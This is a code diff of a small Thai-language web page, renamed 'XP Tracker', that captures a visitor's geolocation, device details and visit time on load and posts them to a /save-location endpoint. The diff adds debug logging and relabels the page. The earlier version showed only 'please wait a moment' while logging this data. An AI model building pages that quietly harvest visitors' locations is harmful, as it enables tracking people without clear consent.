@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>xp</title>
+  <title>XP Tracker</title>
   <style>
     table { border-collapse: collapse; width: 80%; margin-top: 20px;}
     th, td { border: 1px solid #ddd; padding: 8px;}
@@ -9,10 +9,11 @@
   </style>
 </head>
 <body>
-<h1>กรุณารอสักครู่</h1>
+<h1>XP Tracker</h1>
 <p id="status">กำลังบันทึกข้อมูล...</p>
 
-<script src="https://cdn.jsdelivr.net/npm/device-detector-js@2.2.10/dist/device-detector.min.js"></script>
+<script src="https://unpkg.com/device-detector-js/dist/umd/device-detector.min.js"></script>
+
 <script>
 async function sendLocation() {
     let latitude = null;
@@ -56,6 +57,8 @@ async function sendData(lat, lon) {
         visitTime
     };
 
+    console.log("Debug: Payload ก่อนส่งไป server:", payload);
+
     try {
         const res = await fetch('/save-location', {
             method: 'POST',
@@ -63,8 +66,10 @@ async function sendData(lat, lon) {
             body: JSON.stringify(payload)
         });
         const data = await res.text();
+        console.log("Debug: Response จาก server:", data);
         document.getElementById('status').innerText = data;
     } catch (err) {
+        console.error("Debug: Fetch error:", err);
         document.getElementById('status').innerText = 'บันทึกไม่สำเร็จ: ' + err.message;
     }
 }
@@ -72,7 +77,6 @@ async function sendData(lat, lon) {
 window.onload = sendLocation;
 </script>
 
-<p>ดู <a href="/xp" target="_blank">XP รวมทั้งหมด</a> หรือ <a href="/history" target="_blank">ประวัติทั้งหมด</a></p>
-
+<p>ดู <a href="/xp" target="_blank">XP รวมทั้งหมด</a>
 </body>
 </html>
